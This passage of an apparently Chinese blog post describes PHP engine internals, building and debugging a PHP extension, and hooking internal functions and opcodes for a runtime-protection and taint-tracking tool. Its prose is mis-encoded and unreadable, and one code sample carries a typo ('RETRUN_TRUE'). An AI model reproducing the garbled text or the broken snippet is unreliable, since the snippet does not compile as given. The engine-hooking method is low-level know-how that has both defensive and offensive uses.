class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> _zend_function &#123;</span><br><span class="line">zend_uchar type;<span class="comment">/* MUST be the first element of this struct! */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">zend_uchar type;  <span class="comment">/* never used */</span></span><br><span class="line">zend_uchar arg_flags[<span class="number">3</span>]; <span class="comment">/* bitset of arg_info.pass_by_reference */</span></span><br><span class="line"><span class="keyword">uint32_t</span> fn_flags;</span><br><span class="line">zend_string *function_name;</span><br><span class="line">zend_class_entry *scope;</span><br><span class="line"><span class="keyword">union</span> _zend_function *prototype;</span><br><span class="line"><span class="keyword">uint32_t</span> num_args;</span><br><span class="line"><span class="keyword">uint32_t</span> required_num_args;</span><br><span class="line">zend_arg_info *arg_info;</span><br><span class="line">&#125; common;</span><br><span class="line"></span><br><span class="line">zend_op_array op_array;</span><br><span class="line">zend_internal_function internal_function;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>è¿™ä¸ªè”åˆä½“é‡Œè¾¹å®šä¹‰äº†å››ä¸ªç»“æ„ä½“ï¼Œå†…éƒ¨å‡½æ•°é€šè¿‡æ‰©å±•æˆ–è€…å†…æ ¸æä¾›çš„Cå‡½æ•°ï¼Œæ¯”å¦‚timeã€arrayç­‰ï¼Œç¼–è¯‘åç”¨çš„<code>internal_function</code>ç»“æ„ï¼›ç”¨æˆ·è‡ªå®šå‡½æ•°ç¼–è¯‘åä¸ºæ™®é€šçš„opcodeæ•°ç»„ï¼Œç”¨çš„<code>op_array</code>ç»“æ„ã€‚å‰©ä¸‹çš„<code>common</code>å’Œ<code>type</code>å¯ä»¥çœ‹åšæ˜¯<code>internal_function</code>å’Œ<code>op_array</code>çš„headerã€‚</p><p>å®é™…ä¸Šè¿˜æœ‰å…¶ä»–å‡ ç±»å‡½æ•°ï¼Œæš‚æ—¶è¿˜æ²¡å¤ªæ˜ç™½ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338269.jpg" alt="-w634"></p><h4 id="å†…éƒ¨å‡½æ•°"><a href="#å†…éƒ¨å‡½æ•°" class="headerlink" title="å†…éƒ¨å‡½æ•°"></a>å†…éƒ¨å‡½æ•°</h4><p>å†…éƒ¨å‡½æ•°æ˜¯æŒ‡ç”±å†…æ ¸ã€æ‰©å±•æä¾›çš„Cè¯­è¨€ç¼–å†™çš„functionï¼Œè¿™ç±»å‡½æ•°ä¸ç”¨ç»è¿‡opcodeçš„ç¼–è¯‘è¿‡ç¨‹ï¼Œæ•ˆç‡é«˜äºphpç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œè°ƒç”¨æ—¶ä¸æ™®é€šçš„Cç¨‹åºæ²¡æœ‰å·®å¼‚ã€‚</p><p>Zendå¼•æ“ä¸­å®šä¹‰äº†å¾ˆå¤šå†…éƒ¨å‡½æ•°ä¾›ç”¨æˆ·åœ¨PHPä¸­ä½¿ç”¨ï¼Œæ¯”å¦‚ï¼š<code>defineã€definedã€strlenã€method_existsã€class_existsã€function_exist</code>ç­‰ç­‰ï¼Œé™¤äº†Zendå¼•æ“ä¸­å®šä¹‰çš„å†…éƒ¨å‡½æ•°ï¼ŒPHPæ‰©å±•ä¸­ä¹Ÿæä¾›äº†å¤§é‡å†…éƒ¨å‡½æ•°ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çµæ´»çš„é€šè¿‡æ‰©å±•è‡ªè¡Œå®šåˆ¶ã€‚</p><p>å‰æ–‡ä»‹ç»<code>zend_function</code>ä¸º<code>union</code>ï¼Œå…¶ä¸­<code>internal_function</code>å°±æ˜¯å†…éƒ¨å‡½æ•°ç”¨åˆ°çš„å…·ä½“ç»“æ„ï¼š/Zend/zend_compile.h#384<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_internal_function</span> &#123;</span></span><br><span class="line"><span class="comment">/* Common elements */</span></span><br><span class="line">zend_uchar type;</span><br><span class="line">zend_uchar arg_flags[<span class="number">3</span>]; <span class="comment">/* bitset of arg_info.pass_by_reference */</span></span><br><span class="line"><span class="keyword">uint32_t</span> fn_flags;</span><br><span class="line">zend_string* function_name;</span><br><span class="line">zend_class_entry *scope;</span><br><span class="line">zend_function *prototype;</span><br><span class="line"><span class="keyword">uint32_t</span> num_args;</span><br><span class="line"><span class="keyword">uint32_t</span> required_num_args;</span><br><span class="line">zend_internal_arg_info *arg_info;</span><br><span class="line"><span class="comment">/* END of common elements */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> (*handler)(INTERNAL_FUNCTION_PARAMETERS);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_module_entry</span> *<span class="title">module</span>;</span></span><br><span class="line"><span class="keyword">void</span> *reserved[ZEND_MAX_RESERVED_RESOURCES];</span><br><span class="line">&#125; zend_internal_function;</span><br></pre></td></tr></table></figure></p><p><code>zend_internal_function</code>å¤´éƒ¨æ˜¯ä¸€ä¸ªä¸<code>zend_op_array</code>å®Œå…¨ç›¸åŒçš„commonç»“æ„ã€‚</p><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><h3 id="å¼€å‘æµç¨‹"><a href="#å¼€å‘æµç¨‹" class="headerlink" title="å¼€å‘æµç¨‹"></a>å¼€å‘æµç¨‹</h3><p>phpç‰ˆæœ¬7.0.33ï¼Œä¸ºäº†æ–¹ä¾¿å¼€å‘æ‰©å±•ï¼Œå…ˆä¸‹è½½æºç ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/php/php-src/archive/php-7.0.33.zip</span><br></pre></td></tr></table></figure></p><p>è§£å‹åï¼Œåœ¨phpæºç é‡Œæœ‰ä¸€ä¸ªä»£ç ç”Ÿæˆå™¨<code>ext_skel</code>ï¼Œä½äº<code>php-src-php-7.0.33/ext</code>ï¼Œå…ˆæ„å»ºæ‰©å±•åŸºæœ¬æ–‡ä»¶ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ext_skel --extname=passer6y</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338276.jpg" alt="-w697"></p><p>å°†<code>config.m4</code>æ–‡ä»¶ä¸­è¿™å‡ è¡Œå‰çš„dnlå»æ‰ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338283.jpg" alt="-w558"></p><p>åœ¨å¤´æ–‡ä»¶<code>php_passer6y.h</code>æ–‡ä»¶ä¸­å£°æ˜æ‰©å±•å‡½æ•°ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(passer6y_helloworld);</span><br></pre></td></tr></table></figure></p><p>æ¥ç€ç¼–è¾‘<code>passer6y.c</code>ï¼Œæ·»åŠ ä¸€è¡Œï¼š<code>PHP_FE(passer6y_helloworld, NULL)</code><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338291.jpg" alt="-w726"></p><p>æœ€ååœ¨æ–‡ä»¶æœ«å°¾åŠ å…¥<code>passer6y_helloworld</code>å‡½æ•°ä»£ç <br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PHP_FUNCTION(passer6y_helloworld)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> *arg = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">int</span> arg_len, len;</span><br><span class="line">  <span class="keyword">char</span> *strg;</span><br><span class="line">  <span class="keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS() TSRMLS_CC, <span class="string">"s"</span>, &amp;arg, &amp;arg_len) == FAILURE) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  php_printf(<span class="string">"my first ext,Hello World!\n"</span>);</span><br><span class="line">  RETRUN_TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ç¼–è¯‘æ‰©å±•ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php7.0-dev</span><br><span class="line">phpize</span><br><span class="line">./configure --with-php-config=/usr/bin/php-config7.0</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338299.jpg" alt="-w823"></p><p>æµ‹è¯•æ’ä»¶ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -d &quot;extension=passer6y.so&quot; -r &quot;passer6y_helloworld(&apos;123&apos;);&quot;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338306.jpg" alt="-w889"></p><h3 id="GDBè°ƒè¯•"><a href="#GDBè°ƒè¯•" class="headerlink" title="GDBè°ƒè¯•"></a>GDBè°ƒè¯•</h3><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/iamstudy/articles/php_code_rasp_1.html" target="_blank" rel="noopener">https://www.cnblogs.com/iamstudy/articles/php_code_rasp_1.html</a><br>ä¸‹è½½php7.0.23ï¼š<a href="https://mirrors.sohu.com/php/php-7.0.23.tar.gz" target="_blank" rel="noopener">https://mirrors.sohu.com/php/php-7.0.23.tar.gz</a><br>é‡æ–°ç¼–è¯‘phpï¼Œå¼€å¯<code>--enable-debug</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">./configure \</span><br><span class="line">--prefix=/opt/php_debug/ \</span><br><span class="line">--enable-debug \</span><br><span class="line">--enable-cli \</span><br><span class="line">--without-pear \</span><br><span class="line">--enable-embed  \</span><br><span class="line">--enable-inline-optimization \</span><br><span class="line">--enable-shared \</span><br><span class="line">--enable-opcache \</span><br><span class="line">--enable-fpm \</span><br><span class="line">--with-gettext \</span><br><span class="line">--enable-mbstring \</span><br><span class="line">--with-iconv=/usr/local/libiconv \</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">mkdir /opt/php_debug/conf/  </span><br><span class="line">cp php.ini-development /opt/php_debug/conf/php.ini</span><br></pre></td></tr></table></figure></p><p>å†åŠ ä¸ªè½¯è¿æ¥æ–¹ä¾¿æ‰§è¡Œï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /opt/php_debug/bin/php /usr/bin/php_debug</span><br><span class="line">ln -s /opt/php_debug/bin/phpize /usr/bin/phpize_debug</span><br></pre></td></tr></table></figure></p><p>åˆ›å»ºæ’ä»¶çš„æ­¥éª¤å’Œä¹‹å‰ä¸€æ ·ï¼Œåœ¨config.m4æœ€ååŠ ä¸Šï¼š<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if test -z "$PHP_DEBUG"; then</span><br><span class="line">        AC_ARG_ENABLE(debug,</span><br><span class="line">                [--enable-debug  compile with debugging system],</span><br><span class="line">                [PHP_DEBUG=$enableval], [PHP_DEBUG=no]</span><br><span class="line">        )</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></p><p>ç„¶åå†ç¼–è¯‘å³å¯ç”¨gdbè°ƒè¯•äº†</p><blockquote><p>åœ¨makeçš„æ—¶å€™å¯èƒ½ä¼šé‡åˆ°libiconvçš„æŠ¥é”™é—®é¢˜ï¼Œå‚è€ƒè¿™ä¸ªæ–‡ç« å®‰è£…ä¸€ä¸‹å°±OKäº†ï¼Œ<a href="https://www.cnblogs.com/rwxwsblog/p/5451467.html" target="_blank" rel="noopener">https://www.cnblogs.com/rwxwsblog/p/5451467.html</a></p></blockquote><h3 id="vldæŸ¥çœ‹ä»£ç opcode"><a href="#vldæŸ¥çœ‹ä»£ç opcode" class="headerlink" title="vldæŸ¥çœ‹ä»£ç opcode"></a>vldæŸ¥çœ‹ä»£ç opcode</h3><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/miao-zp/p/6374311.html" target="_blank" rel="noopener">https://www.cnblogs.com/miao-zp/p/6374311.html</a><br>å®‰è£…vldï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://pecl.php.net/get/vld-0.14.0.tgz</span><br><span class="line">tar zxvf vld-0.14.0.tgz </span><br><span class="line">cd vld-0.14.0/</span><br></pre></td></tr></table></figure></p><p>æ‰¾åˆ°php-configè·¯å¾„: <code>locate php-config</code><br>ç¼–è¯‘ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./configure --with-php-config=/usr/bin/php-config7.0 --enable-vld</span><br><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><p>æ£€æŸ¥æ˜¯å¦ç¼–è¯‘æˆåŠŸï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338314.jpg" alt="-w703"><br>ä¿®æ”¹php.ini <code>/etc/php/7.0/cli/php.ini</code>ï¼Œåœ¨æœ€ååŠ ä¸Šï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=vld.so</span><br></pre></td></tr></table></figure></p><p>æ£€æµ‹æ˜¯å¦å®‰è£…æˆåŠŸï¼š<code>php -r &quot;phpinfo();&quot; | grep &quot;vld&quot;</code><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338321.jpg" alt="-w657"></p><p>åŠŸèƒ½æµ‹è¯•ï¼š<br>å†™ä¸€ä¸ªphpinfoï¼Œç„¶åæ‰§è¡Œä¸‹è¾¹å‘½ä»¤ï¼Œ<code>-dvld.active</code>å‚æ•°ä¸º1æ—¶ä½¿ç”¨vldæ‰©å±•ï¼Œ<code>-dvld.execute</code>ä¸º1æ—¶æ‰§è¡Œæ”¹æ–‡ä»¶ï¼Œè¿™é‡Œä¸éœ€è¦æ‰§è¡Œæ–‡ä»¶ï¼Œå°±çœ‹ä¸€ä¸‹phpä»£ç è½¬æ¢å¯¹åº”çš„opcodeæŒ‡ä»¤ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -dvld.active=1 -dvld.execute=0 1.php</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338330.jpg" alt="-w638"></p><h3 id="apacheé…ç½®"><a href="#apacheé…ç½®" class="headerlink" title="apacheé…ç½®"></a>apacheé…ç½®</h3><p>è¿˜æ˜¯ä¹‹å‰çš„æºç ï¼Œé‡æ–°ç¼–è¯‘php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./buildconf --force &amp;&amp; ./configure --disable-all --enable-debug --prefix=/opt/php --with-apxs2=/usr/bin/apxs &amp;&amp; make &amp;&amp; make install</span><br></pre></td></tr></table></figure></p><p>çˆ†äº†ä¸€ä¸ªçº¿ç¨‹å®‰å…¨çš„é—®é¢˜ï¼Œæ‰§è¡Œä¸‹é¢ä¸¤ä¸ªå‘½ä»¤å‡‘åˆç”¨ç€(æ¯ä¸ªå­è¿›ç¨‹åªæœ‰ä¸€ä¸ªçº¿ç¨‹)ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//  apache2 -t æŸ¥çœ‹é”™è¯¯æ—¥å¿—</span><br><span class="line">a2dismod mpm_event</span><br><span class="line">a2enmod mpm_prefork</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338337.jpg" alt="-w884"></p><p>ä¹Ÿå¯ä»¥ç”¨åº·å¸ˆå‚…å†™çš„dockerfileï¼Œä¸€é”®æ‹‰å–ç¯å¢ƒï¼š<a href="media/15822119434822/Dockerfile.">Dockerfile</a></p><p>å‘½ä»¤å¤‡å¿˜ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php --ini        // æŸ¥çœ‹php.inié»˜è®¤é…ç½®è·¯å¾„</span><br></pre></td></tr></table></figure></p><h2 id="å‡½æ•°Hook"><a href="#å‡½æ•°Hook" class="headerlink" title="å‡½æ•°Hook"></a>å‡½æ•°Hook</h2><p>ä¸¤ç§æ–¹å¼ï¼š</p><ul><li>é‡å‘½åå‡½æ•°ï¼Œå¹¶åœ¨<code>function_table</code>åˆ é™¤åŸå‡½æ•°å®šä¹‰ï¼Œæ¥ç€åœ¨phpä¸­é‡æ–°å®šä¹‰ä¸€ä¸ªè¯¥å‡½æ•°(åƒwafä¸€æ ·åœ¨å…¥å£include)ï¼Œå¹¶å¯¹å‚æ•°è¿›è¡Œå¨èƒåˆ¤æ–­(prvdçš„payloadæ¨¡å¼)</li><li>ç›´æ¥åœ¨åº•å±‚Hook opcodeï¼Œå¹¶æ£€æµ‹å‡½æ•°å‡½æ•°(taintæ¨¡å¼)</li></ul><h3 id="é‡å‘½åå‡½æ•°"><a href="#é‡å‘½åå‡½æ•°" class="headerlink" title="é‡å‘½åå‡½æ•°"></a>é‡å‘½åå‡½æ•°</h3><p>è¿™é‡Œçš„é‡å‘½åå†…éƒ¨å‡½æ•°æ˜¯åœ¨<code>MINIT</code>é˜¶æ®µè¿›è¡Œå®ç°çš„ï¼Œåœ¨<code>RINIT</code>é˜¶æ®µæ˜¯æ— æ³•å¯¹å·²æœ‰çš„å†…éƒ¨å‡½æ•°è¿›è¡Œä¿®æ”¹åç§°ï¼Œåªèƒ½å¯¹ç”¨æˆ·å‡½æ•°ä¿®æ”¹(å³phpä¸­è‡ªå®šä¹‰çš„å‡½æ•°)ã€‚</p><p>å‚è€ƒfate0å¸ˆå‚…çš„<a href="https://github.com/fate0/xmark" target="_blank" rel="noopener">xmark</a>é¡¹ç›®å®ç°çš„<code>PHP_FUNCTION(xrename_function)</code>å‡½æ•°ï¼Œæ ¸å¿ƒåœ¨è¿™æ®µï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">Bucket *p = rename_hash_key(EG(function_table), orig_fname, new_fname, XMARK_IS_FUNCTION);</span><br></pre></td></tr></table></figure></p><p>è·Ÿè¿›<code>rename_hash_key</code>å‡½æ•°ï¼š<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> zend_always_inline Bucket *<span class="title">rename_hash_key</span><span class="params">(HashTable *ht, zend_string *orig_name, zend_string *new_name, <span class="keyword">int</span> type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    zend_ulong h;</span><br><span class="line">    <span class="keyword">uint32_t</span> nIndex;</span><br><span class="line">    <span class="keyword">uint32_t</span> idx;</span><br><span class="line">    Bucket *p = <span class="literal">NULL</span>, *arData, *prev = <span class="literal">NULL</span>;</span><br><span class="line">    zend_bool found = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    orig_name = zend_string_tolower(orig_name);</span><br><span class="line">    new_name = zend_string_tolower(new_name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (zend_hash_exists(ht, new_name)) &#123;</span><br><span class="line">        zend_string_release(orig_name);</span><br><span class="line">        zend_string_release(new_name);</span><br><span class="line">        zend_error(E_ERROR, <span class="string">"function/class '%s' already exists"</span>, ZSTR_VAL(new_name));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    h = zend_string_hash_val(orig_name);</span><br><span class="line">    arData = ht-&gt;arData;</span><br><span class="line">    nIndex = h | ht-&gt;nTableMask;</span><br><span class="line">    idx = HT_HASH_EX(arData, nIndex);</span><br><span class="line">    <span class="keyword">while</span> (EXPECTED(idx != HT_INVALID_IDX)) &#123;</span><br><span class="line">        prev = p;</span><br><span class="line">        p = HT_HASH_TO_BUCKET_EX(arData, idx);</span><br><span class="line">        <span class="keyword">if</span> (EXPECTED(p-&gt;key == orig_name)) &#123; <span class="comment">/* check for the same interned string */</span></span><br><span class="line">            found = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (EXPECTED(p-&gt;h == h) &amp;&amp;</span><br><span class="line">                   EXPECTED(p-&gt;key) &amp;&amp;</span><br><span class="line">                   EXPECTED(ZSTR_LEN(p-&gt;key) == ZSTR_LEN(orig_name)) &amp;&amp;</span><br><span class="line">                   EXPECTED(<span class="built_in">memcmp</span>(ZSTR_VAL(p-&gt;key), ZSTR_VAL(orig_name), ZSTR_LEN(orig_name)) == <span class="number">0</span>)) &#123;</span><br><span class="line">            found = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        idx = Z_NEXT(p-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!found) &#123;</span><br><span class="line">        zend_string_release(orig_name);</span><br><span class="line">        zend_string_release(new_name);</span><br><span class="line">        zend_error(E_ERROR, <span class="string">"function/class '%s' does not exists"</span>, ZSTR_VAL(orig_name));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// rehash</span></span><br><span class="line">    <span class="keyword">if</span> (!prev &amp;&amp; Z_NEXT(p-&gt;val) == HT_INVALID_IDX) &#123;  <span class="comment">// only p</span></span><br><span class="line">        HT_HASH(ht, nIndex) = HT_INVALID_IDX;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (prev &amp;&amp; Z_NEXT(p-&gt;val) != HT_INVALID_IDX) &#123;  <span class="comment">// p in middle</span></span><br><span class="line">        Z_NEXT(prev-&gt;val) = Z_NEXT(p-&gt;val);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (prev &amp;&amp; Z_NEXT(p-&gt;val) == HT_INVALID_IDX) &#123;  <span class="comment">// p in tail</span></span><br><span class="line">        Z_NEXT(prev-&gt;val) = HT_INVALID_IDX;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!prev &amp;&amp; Z_NEXT(p-&gt;val) != HT_INVALID_IDX) &#123;  <span class="comment">// p in head</span></span><br><span class="line">        HT_HASH(ht, nIndex) = Z_NEXT(p-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    zend_string_release(p-&gt;key);</span><br><span class="line">    p-&gt;key = zend_string_init_interned(ZSTR_VAL(new_name), ZSTR_LEN(new_name), <span class="number">1</span>);</span><br><span class="line">    p-&gt;h = h = zend_string_hash_val(p-&gt;key);</span><br><span class="line">    nIndex = h | ht-&gt;nTableMask;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é‡å‘½åå‡½æ•°å</span></span><br><span class="line">    <span class="keyword">if</span> (type == XMARK_IS_FUNCTION) &#123;</span><br><span class="line">        zend_string_release(p-&gt;val.value.func-&gt;common.function_name);</span><br><span class="line">        zend_string_addref(p-&gt;key);</span><br><span class="line">        p-&gt;val.value.func-&gt;common.function_name = p-&gt;key;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (HT_HASH(ht, nIndex) != HT_INVALID_IDX)</span><br><span class="line">        Z_NEXT(p-&gt;val) = HT_HASH(ht, nIndex);</span><br><span class="line"></span><br><span class="line">    HT_HASH(ht, nIndex) = idx;</span><br><span class="line"></span><br><span class="line">    zend_string_release(orig_name);</span><br><span class="line">    zend_string_release(new_name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="Hook-opcode"><a href="#Hook-opcode" class="headerlink" title="Hook opcode"></a>Hook opcode</h3><p>ä¸ºä»€ä¹ˆè¦hook opcodeå‘¢ï¼Ÿåœ¨åæ¥çš„æµ‹è¯•ä¸­å‘ç°åƒ<code>echo</code>ã€<code>eval</code>è¿™äº›ï¼Œå®ƒæ˜¯ä¸€ä¸ªè¯­è¨€ç‰¹æ€§ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œåœ¨<code>EG(function_table)</code>è¿™ä¸ªè®°å½•æ‰€æœ‰PHPå‡½æ•°çš„å“ˆå¸Œè¡¨ä¸­æ‰¾ä¸åˆ°ï¼Œä½†æ˜¯ä»–ä»¬æœ€ç»ˆéƒ½è¦è§£ææˆopcodeï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼æ¥åŠ«æŒå‡½æ•°ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846062338346.jpg" alt="-w893"></p><p>å†ä¸¾ä¸€ä¸ªé‡åˆ°çš„ä¾‹å­ï¼Œæ¯”å¦‚åœ¨æ±¡ç‚¹æ ‡è®°çš„æ—¶å€™ï¼Œç”¨æˆ·å¯æ§<code>$a</code>ï¼Œä½†åœ¨åæ–‡ç»è¿‡å­—ç¬¦ä¸²æ‹¼æ¥<code>$b = &quot;xx&quot;.$a</code>ï¼Œå°†æ¶æ„ä»£ç ä¼ é€’ç»™<code>$b</code>å˜é‡ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬æ˜¯æ²¡æœ‰åŠæ³•åœ¨å‡½æ•°å±‚é¢æ§åˆ¶çš„æ 